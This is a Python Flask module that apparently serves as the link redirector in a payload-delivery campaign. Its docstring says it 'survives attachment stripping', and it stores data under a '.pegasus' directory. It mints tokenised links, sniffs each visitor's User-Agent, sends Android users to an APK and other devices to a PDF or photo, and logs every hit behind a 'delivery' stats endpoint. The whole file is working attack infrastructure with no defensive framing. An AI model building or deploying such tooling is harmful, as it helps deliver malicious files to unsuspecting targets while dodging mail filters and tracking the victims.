"""UA-sniffing hop. Survives attachment stripping."""
import json
import pathlib
import secrets
import sqlite3
import time

from flask import abort, redirect, request

DB = pathlib.Path.home() / ".pegasus" / "landing.db"
RULES = [(("android",), "apk"), (("iphone", "ipad", "ios"), "pdf"),
         (("windows", "macintosh", "linux"), "pdf")]


def _db() -> sqlite3.Connection:
    DB.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(DB, timeout=10)
    con.execute("CREATE TABLE IF NOT EXISTS links(token TEXT PRIMARY KEY, artifacts TEXT,"
                " hits INTEGER DEFAULT 0, created REAL)")
    con.execute("CREATE TABLE IF NOT EXISTS hits(id INTEGER PRIMARY KEY, token TEXT,"
                " ua TEXT, served TEXT, ts REAL)")
    return con


def mint(artifacts: dict) -> str:
    token = secrets.token_urlsafe(8)
    con = _db()
    con.execute("INSERT INTO links(token, artifacts, created) VALUES(?,?,?)",
                (token, json.dumps(artifacts), time.time()))
    con.commit()
    return token


def pick(token: str) -> str | None:
    con = _db()
    row = con.execute("SELECT artifacts FROM links WHERE token=?", (token,)).fetchone()
    if not row:
        return None
    artifacts = json.loads(row[0])
    ua = (request.headers.get("User-Agent") or "").lower()
    chosen = next((artifacts[k] for needles, k in RULES
                   if any(n in ua for n in needles) and artifacts.get(k)), None)
    chosen = chosen or artifacts.get("pdf") or artifacts.get("apk") or artifacts.get("photo")
    con.execute("UPDATE links SET hits = hits + 1 WHERE token=?", (token,))
    con.execute("INSERT INTO hits(token, ua, served, ts) VALUES(?,?,?,?)",
                (token, ua[:300], chosen, time.time()))
    con.commit()
    return chosen


def stats(token: str) -> dict:
    con = _db()
    row = con.execute("SELECT hits FROM links WHERE token=?", (token,)).fetchone()
    events = con.execute("SELECT ua, served, ts FROM hits WHERE token=? ORDER BY id",
                         (token,)).fetchall()
    return {"hits": row[0] if row else 0,
            "events": [{"ua": e[0], "served": e[1], "ts": e[2]} for e in events]}


def register(app, ok, fail):
    @app.get("/l/<token>")
    def landing_hit(token):
        target = pick(token)
        if not target:
            abort(404)
        return redirect(target)

    @app.get("/api/delivery/link/<token>")
    def landing_stats(token):
        return ok(stats(token))
